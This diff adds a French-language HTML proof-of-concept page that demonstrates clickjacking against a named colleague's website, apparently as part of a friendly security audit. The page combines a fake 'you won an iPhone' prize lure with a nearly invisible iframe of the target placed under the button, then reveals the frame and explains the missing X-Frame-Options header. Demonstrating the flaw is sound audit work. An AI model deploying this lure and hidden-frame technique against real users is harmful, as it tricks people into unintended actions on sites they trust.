@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 Cadeau Surprise - Clique pour gagner !</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .gift-container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            max-width: 600px;
+            margin: 50px auto;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hidden-iframe {
+            position: absolute;
+            top: 200px;
+            left: 250px;
+            width: 100px;
+            height: 50px;
+            opacity: 0.01;
+            z-index: 999;
+            border: none;
+        }
+        
+        .gift-button {
+            background: linear-gradient(45deg, #ff4757, #ff3742);
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255,71,87,0.4);
+            transition: transform 0.2s;
+            animation: bounce 2s infinite;
+        }
+        
+        .gift-button:hover { transform: translateY(-2px); }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+        
+        .warning-box {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255,0,0,0.9);
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            max-width: 300px;
+            font-size: 12px;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <div class="gift-container">
+        <h1>🎉 FÉLICITATIONS ! 🎉</h1>
+        <h2>Vous avez gagné un iPhone 15 Pro Max !</h2>
+        <p style="margin: 30px 0;">Pour récupérer votre prix, cliquez sur le bouton ci-dessous</p>
+        
+        <!-- IFRAME CACHÉE POINTANT VERS LE SITE DE TON COLLÈGUE -->
+        <iframe src="https://cesizen-five.vercel.app" class="hidden-iframe" id="victim-frame"></iframe>
+        
+        <button class="gift-button" onclick="revealHack()">
+            🎁 RÉCUPÉRER MON CADEAU
+        </button>
+        
+        <p style="font-size: 14px; color: #666; margin-top: 20px;">
+            * Offre limitée - Dépêchez-vous !
+        </p>
+    </div>
+    
+    <div class="warning-box">
+        <strong>🚨 DÉMONSTRATION CLICKJACKING</strong><br>
+        Cette page contient une iframe invisible de https://cesizen-five.vercel.app<br>
+        Votre clic est détourné vers le site de votre collègue !<br>
+        <small>Audit de sécurité par un collègue bienveillant</small>
+    </div>
+
+    <script>
+        function revealHack() {
+            // Révéler l'iframe cachée
+            const iframe = document.getElementById('victim-frame');
+            iframe.style.opacity = '1';
+            iframe.style.border = '3px solid red';
+            iframe.style.position = 'relative';
+            iframe.style.width = '100%';
+            iframe.style.height = '400px';
+            iframe.style.top = '0';
+            iframe.style.left = '0';
+            
+            // Message d'explication
+            alert('🎯 CLICKJACKING RÉUSSI !\n\n' +
+                  'Votre clic a été détourné !\n\n' +
+                  'L\'iframe ci-dessous charge le site de votre collègue.\n' +
+                  'Dans un vrai scénario, un attaquant pourrait :\n' +
+                  '• Vous faire cliquer sur des boutons cachés\n' +
+                  '• Voler vos informations de connexion\n' +
+                  '• Effectuer des actions à votre insu\n\n' +
+                  'Ceci est une démonstration éducative !');
+            
+            // Changer le contenu de la page
+            document.querySelector('.gift-container').innerHTML = `
+                <h1 style="color: red;">🚨 CLICKJACKING DÉMONTRÉ !</h1>
+                <p>Votre clic a été détourné vers :</p>
+                <iframe src="https://cesizen-five.vercel.app" style="width: 100%; height: 400px; border: 3px solid red;"></iframe>
+                <p style="color: red; font-weight: bold; margin-top: 20px;">
+                    Le site de votre collègue n'a pas d'en-tête X-Frame-Options !<br>
+                    Il est vulnérable au clickjacking.
+                </p>
+            `;
+        }
+        
+        // Log de sécurité
+        console.log('%c🎯 DÉMONSTRATION CLICKJACKING', 'color: red; font-size: 16px;');
+        console.log('Site cible: https://cesizen-five.vercel.app');
+        console.log('Vulnérabilité: Pas d\'en-tête X-Frame-Options');
+    </script>
+</body>
+</html>
